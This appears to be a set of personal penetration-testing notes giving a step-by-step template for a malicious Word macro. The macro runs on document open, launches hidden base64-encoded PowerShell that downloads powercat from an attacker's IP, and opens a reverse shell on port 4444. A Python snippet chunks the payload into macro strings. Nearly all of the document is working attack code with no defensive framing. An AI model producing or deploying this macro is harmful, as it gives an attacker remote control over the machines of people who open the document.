Reverse shell template via macro:

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub


1. To base64 encode the command utilizing pwsh on kali:
IEX(New-Object System.Net.WebClient).DownloadString('http://{MYIPADDRESS}/powercat.ps1');powercat -c {MYIPADDRESS} -p 4444 -e powershell



2. Split the base64 encoded command with python:
str = "powershell.exe -nop -w hidden -e {paste the command}"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')



3. Copy the split command and paste it so the macro looks like this:
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "PLACEHOLDER"
        Str = Str + "FOR THE"
    ...
        Str = Str + "SPLIT"
        Str = Str + "COMMAND"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
